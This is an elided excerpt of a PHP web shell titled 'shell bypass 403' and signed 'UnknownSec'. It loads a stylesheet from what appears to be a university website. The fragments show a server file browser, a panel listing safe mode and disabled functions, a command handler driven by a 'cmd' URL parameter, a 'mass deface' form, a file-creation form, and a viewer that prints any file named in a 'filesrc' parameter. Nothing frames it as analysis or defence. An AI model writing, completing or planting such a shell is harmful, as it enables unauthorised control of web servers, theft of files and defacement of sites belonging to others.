...
$_n = 'UnknownSec';
$_s = "<style>table{display:none;}</style><div class='bkp table-responsive'><hr></div>";
...
<html>
	<head>
		...
		<link rel='stylesheet' href='//feb.ulb.ac.id/wp-admin/css/mini.css'>
	...
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<div class='corner text-secondary anu'>shell bypass 403</div>
				...
				if($pat == '' && $id == 0){
					$a = true;
					echo '<div class="bkp table-responsive"><i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
				continue;
				}
				if($pat == '') continue;
...
<div class='container-fluid'>
	...
	<div class='collapse shell mb-3' id='collapseExample'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			...
			Safe Mode: $sm<br />
			Disable Function:<div class='bkp table-responsive'>$disfc</div>
		</div>
	</div>
...
<div class='mb-3'>
	...
	<div class='custom-control custom-switch'>
		...
		<input class='btn btn-outline-light btn-sm btn-block' type='submit' name='start' value='mass deface'>
	</form>
</div>";
}
if(isset($_GET['cmd'])) {
...
echo '<strong>No results.</strong> <div class="bkp table-responsive">'.ini_get("disable_functions").'</div> '.er().'</div>';endif;
echo '
</div>';
}
...
<div class='mb-3'>
	<form method='POST'>
		...
		<input class='btn btn-outline-light btn-sm btn-block' type='submit' name='bikin' value='buat'>
	</form>
</div>";
}
...
<div class="container-fluid language-javascript">
	<div class="shell mb-3">
		<pre style="font-size:10px;"><code>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</code></pre>
	</div>
</div>';
